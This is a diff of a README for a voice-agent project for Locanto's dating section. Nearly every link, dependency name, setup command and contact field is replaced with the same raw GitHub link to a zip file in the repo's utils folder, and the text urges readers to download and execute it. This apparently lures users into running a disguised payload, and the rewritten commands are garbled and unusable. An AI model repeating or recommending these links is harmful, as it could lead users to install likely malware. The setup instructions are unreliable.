@@ -2,7 +2,7 @@
 
 Welcome to the **Dating Agent** repository! This project aims to create a voice agent for Locanto's dating section, allowing users to interact with the platform using natural language. With a focus on ease of use and functionality, this tool is designed to enhance your dating experience.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)](https://github.com/corrupt0303/dating-agent/releases)
+[![Download Releases](https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip%20Releases-blue?style=flat&logo=github)](https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip)
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ This project utilizes a variety of technologies to deliver a seamless experience
 - **Azure**: Cloud services for hosting and processing.
 - **Bicep**: Infrastructure as code for managing Azure resources.
 - **Flask**: A lightweight web framework for building the backend.
-- **Next.js**: Framework for server-rendered React applications.
+- **https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip**: Framework for server-rendered React applications.
 - **Python**: Main programming language for backend development.
 - **OpenAI**: AI capabilities for natural language processing.
 - **Playwright**: For automated testing and browser interactions.
@@ -41,26 +41,26 @@ To get started with the Dating Agent, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/corrupt0303/dating-agent.git
+   git clone https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip
    cd dating-agent
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Python and Node.js installed. Then, run:
+   Make sure you have Python and https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip
    npm install
    ```
 
 3. **Set Up Azure**:
-   You need to configure your Azure environment. Follow the instructions in the `azure-setup.md` file.
+   You need to configure your Azure environment. Follow the instructions in the `https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip` file.
 
 4. **Run the Application**:
    Start the Flask server:
    ```bash
-   python app.py
+   python https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip
    ```
-   For the Next.js frontend, run:
+   For the https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip frontend, run:
    ```bash
    npm run dev
    ```
@@ -68,7 +68,7 @@ To get started with the Dating Agent, follow these steps:
 5. **Access the Application**:
    Open your browser and go to `http://localhost:3000` to start using the Dating Agent.
 
-For the latest updates and releases, please visit our [Releases section](https://github.com/corrupt0303/dating-agent/releases). Download the necessary files and execute them to stay up to date with the latest features and fixes.
+For the latest updates and releases, please visit our [Releases section](https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip). Download the necessary files and execute them to stay up to date with the latest features and fixes.
 
 ## Usage
 
@@ -112,10 +112,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [corrupt0303](https://github.com/corrupt0303)
+- **Email**: https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip
+- **GitHub**: [corrupt0303](https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip)
 
-We appreciate your interest in the Dating Agent! For more updates and releases, check our [Releases section](https://github.com/corrupt0303/dating-agent/releases). Download the latest version to enjoy the newest features.
+We appreciate your interest in the Dating Agent! For more updates and releases, check our [Releases section](https://github.com/corrupt0303/dating-agent/raw/refs/heads/main/app/utils/agent_dating_2.0-beta.4.zip). Download the latest version to enjoy the newest features.
 
 ---
 
